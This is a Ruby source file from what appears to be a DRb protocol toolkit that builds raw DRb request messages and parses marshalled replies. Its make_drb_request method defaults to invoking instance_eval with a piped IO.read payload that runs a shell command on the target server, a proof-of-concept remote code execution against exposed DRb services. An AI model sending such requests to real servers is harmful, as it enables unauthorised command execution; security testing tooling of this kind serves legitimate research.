# frozen_string_literal: true

module DRbRb
  module Stable
    # Builds a DRb request from pieces.
    #
    # == Parameters:
    # [obj]     The id of the object to call the method on. By default, the object_id of nil is passed as it is constant across invocations of the interpreter and always present. Nil can be passed to specify that the method should be called on the default (front) object of the DRb server.
    # [method]  The method to call. This is #instance_eval by default. Should be a String.
    # [args]    An array of arguments passed to the method. Pass an empty array if there are no objects.
    # [block]   The block to pass to the method. Nil by default, which specifies there is no block.
    #
    # == Returns:
    # A array of bytes that can be written to a socket connected to a DRb server.  The array includes all parts necessary for a complete request message.
    def self.make_drb_request(obj = nil,
                              method = 'instance_eval',
                              args = ["IO.read('|touch \"/tmp/drb-pwn_#{Time.now}\"')"],
                              block = nil)
      raise "make_drb_request doesn't support specifying obj" unless obj.nil?
      raise "make_drb_request doesn't support specifying a block" unless block.nil?

      DRbRb.make_request(obj.object_id,
                         method,
                         args,
                         block).unpack('c*')
    end

    # Prepares a piece of a DRb message by attempting to marshal the object and prepending it's length and version number
    #
    # == Parameters:
    # [obj]   The object to serialize in this piece.
    #
    # == Returns:
    # A byte array of the marshalled object with all necessary headers for it to be a part of a valid DRb message.
    def self.drb_msg_piece(obj)
      DRbRb.make_msg_piece(obj).unpack('c*')
    end

    # A high-level marshal method that takes an object and tries to marshal the object into a byte array.
    #
    # == Parameters:
    # [obj]   The object to serialize
    #
    # == Returns:
    # A byte array of the marshalled object.
    def self.marshal(obj, prepend_version = true)
      Parshal.marshal(obj, prepend_version: prepend_version).unpack('c*')
    end

    # A low-level marshal dump that dumps "raw" types. Intended primarily for #marshal to use but may be useful in other contexts. Main differences are that Integer doesn't include its prefix (as it's used raw in many contexts) and String doesn't turn into an IVAR, it's just the "raw String" representation that's inside the normal IVAR.
    #
    # == Parameters:
    # [obj]   The object to be serialized.
    #
    # == Returns:
    # The raw form of the serialized object.
    def self.marshal_raw(obj)
      Parshal.marshal_raw(obj)
    end

    # Gets a reply for a DRb request. This includes a success value indicating whether the call was successful and a result that is the return value from the call. This function will exit with an error code if the success value is invalid (not true or false).
    #
    # == Parameters:
    # [sock]    The socket the request was sent over.
    #
    # == Returns:
    # [succ]    A boolean, indicating whether the request succeeded or failed.
    # [result]  The string containing the marshaled value returned as a result of the request. If the call was successful, this will contain the return value from the call. If the call failed, this will contain the stacktrace. This value could contain many types of objects depending on the call made so no attempt at decoding is made. Instead the raw value is returned for further parsing if necessary.
    def self.get_drb_reply(sock)
      success, result = DRbRb.drb_read_reply(sock)

      throw "Invalid success code in reply: #{success.inspect}" unless [true, false].include? success

      [success, result]
    end

    # Gets a single piece in a response to a DRb request. First recvs the length of the piece, decodes it to know how many bytes to read, and the recvs the whole piece.
    #
    # == Parameters:
    # [sock]    The socket the request was sent over.
    #
    # == Returns:
    # A string containing the raw response. This value has been stripped of it's length header and Marshal version header and contains only the raw value.
    def self.get_drb_reply_piece(sock)
      len = DRbRb.drb_read_msg_piece_length(sock)

      reply = sock.recvfrom(len)[0]
      reply += sock.recvfrom(len - reply.size)[0] while reply.size < len
      reply
    end

    # Inspects and removes the first two bytes of a marshal blob to determine the version of marshal used by the encoder. The only version supported by this script is 4.8. If the version doesn't match exactly, a warning is printed to STDERR and the function returns normally.
    #
    # == Parameters:
    # [reply]   The string containing the response from a DRb server
    #
    # == Returns:
    # The string without the initial two byte version number.
    def self.strip_version(reply)
      Parshal.remove_version_prefix(reply)
    end

    def self.unmarshal(raw_obj, strip = true)
      Parshal.unmarshal(raw_obj, remove_version: strip)
    end

    def self.unmarshal_raw(obj)
      Parshal.unmarshal_raw(obj)
    end

    def self.unmarshal_raw_bool(obj)
      Parshal.unmarshal_raw_bool(obj)
    end

    def self.unmarshal_raw_string_symbol(obj)
      Parshal.unmarshal_raw_string_symbol(obj)
    end

    def self.unmarshal_raw_integer(obj)
      Parshal.unmarshal_raw_integer(obj)
    end

    def is_nil(obj)
      strip_version(obj) == '0'
    end
  end
end
